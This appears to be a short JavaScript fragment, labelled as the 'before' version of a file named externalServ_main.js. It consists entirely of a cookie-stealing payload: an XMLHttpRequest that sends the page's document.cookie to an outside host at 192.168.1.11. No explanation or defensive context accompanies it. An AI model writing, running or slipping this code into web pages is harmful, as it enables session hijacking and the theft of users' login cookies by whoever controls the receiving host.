// Before: externalServ_main.js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.11/?cookie=' + document.cookie);
request.send();

